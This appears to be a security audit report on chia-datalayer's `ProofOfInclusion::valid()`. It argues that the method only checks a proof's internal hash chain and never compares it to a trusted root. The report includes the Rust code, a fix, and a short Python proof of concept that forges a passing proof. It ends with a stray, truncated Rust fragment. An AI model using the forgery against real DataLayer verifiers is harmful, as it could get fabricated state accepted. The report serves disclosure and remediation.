### Title
`ProofOfInclusion::valid()` Is a Tautology That Never Verifies Against an External Root Hash, Allowing Forged DataLayer Inclusion Proofs to Pass Validation — (File: `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`)

---

### Summary

The `valid()` method on `ProofOfInclusion` is supposed to cryptographically verify that a leaf is included in a specific Merkle tree. However, the final comparison in the function is a logical tautology: it compares `existing_hash` (the hash computed by walking the proof chain) against `self.root_hash()`, which is defined to return `last.combined_hash` — the exact same value that `existing_hash` holds at the end of the loop. The check is always `true` for any internally consistent proof, regardless of whether the proof corresponds to the actual tree root. An attacker can construct a forged `ProofOfInclusion` for any arbitrary leaf, with any arbitrary root, and `valid()` will return `true`.

---

### Finding Description

`ProofOfInclusion::valid()` is implemented as follows:

```rust
pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;

    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );

        if calculated_hash != layer.combined_hash {
            return false;
        }

        existing_hash = calculated_hash;
    }

    existing_hash == self.root_hash()   // ← always true
}
``` [1](#0-0) 

After the loop completes, `existing_hash` holds the last `calculated_hash`. Because the loop only continues when `calculated_hash == layer.combined_hash`, `existing_hash` is always equal to `last_layer.combined_hash` at loop exit.

`root_hash()` is defined as:

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash      // ← same value as existing_hash
    } else {
        self.node_hash
    }
}
``` [2](#0-1) 

So the final check `existing_hash == self.root_hash()` reduces to `last.combined_hash == last.combined_hash`, which is unconditionally `true` whenever layers are present. For the zero-layer case (single-node tree), it reduces to `self.node_hash == self.node_hash`, also unconditionally `true`.

The function never compares the computed root against any externally known, trusted root hash. It only verifies that the proof's own internal hash chain is self-consistent — a property the attacker fully controls when constructing the proof.

`ProofOfInclusion` is a `Streamable` type exposed directly to Python via `py_valid()`: [3](#0-2) 

Any Python caller that invokes `proof.valid()` to gate DataLayer state decisions receives a meaningless guarantee.

### Impact Explanation

An attacker who can deliver a `ProofOfInclusion` object to any verifier that calls only `proof.valid()` can:

- Forge a proof asserting that an arbitrary key-value pair is present in a DataLayer store whose actual root hash is known and different.
- Cause the verifier to accept fabricated DataLayer state as authentic, enabling false inclusion claims for any key the attacker chooses.
- Repeat the attack for exclusion proofs built on top of this primitive, or for any higher-level DataLayer protocol logic that trusts `valid()` as a complete check.

This matches the allowed High impact: **DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion, letting untrusted input prove invalid state.**

---

### Likelihood Explanation

The function is named `valid()` and is the sole self-contained verification method on `ProofOfInclusion`. Its Python binding is `py_valid()`. Any developer or protocol component that calls `proof.valid()` expecting a complete cryptographic guarantee — without separately comparing `proof.root_hash()` against a trusted external root — is silently unprotected. The `ProofOfInclusion` type is `Streamable`, so forged proofs can be constructed offline and transmitted over the network. No privileged access is required; the attacker only needs to craft a byte sequence that deserializes into a self-consistent `ProofOfInclusion`.

---

### Recommendation

`valid()` must accept a trusted external root hash and compare against it, not against `self.root_hash()`:

```rust
pub fn valid(&self, expected_root: &Hash) -> bool {
    let mut existing_hash = self.node_hash;

    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );

        if calculated_hash != layer.combined_hash {
            return false;
        }

        existing_hash = calculated_hash;
    }

    &existing_hash == expected_root   // compare against caller-supplied root
}
```

All call sites (Rust and Python) must be updated to supply the trusted root hash obtained from the canonical on-chain DataLayer coin record, not from the proof itself.

### Proof of Concept

```python
import hashlib
from chia_rs.datalayer import ProofOfInclusion, ProofOfInclusionLayer, Side

# Attacker-chosen leaf hash (does NOT exist in the real tree)
fake_leaf = hashlib.sha256(b"fake key-value pair").digest()
fake_sibling = hashlib.sha256(b"attacker-controlled sibling").digest()

# Compute a self-consistent combined_hash (Side.Left → sha256(\x02 || sibling || leaf))
combined = hashlib.sha256(b"\x02" + fake_sibling + fake_leaf).digest()

forged_proof = ProofOfInclusion(
    node_hash=fake_leaf,
    layers=[
        ProofOfInclusionLayer(
            other_hash_side=Side.Left,
            other_hash=fake_sibling,
            combined_hash=combined,   # attacker sets this to match
        )
    ],
)

# valid() returns True even though this proof has nothing to do with the real tree
assert forged_proof.valid(), "Expected True — tautology confirmed"

# The "root" the proof claims is whatever the attacker chose
print("Forged root:", forged_proof.root_hash().hex())
```

pub fn internal_hash(left_hash: &Hash, right_hash: &Hash) -> Hash {
    let mut hasher = Sha256::new();
    hasher.update(b"\x02");
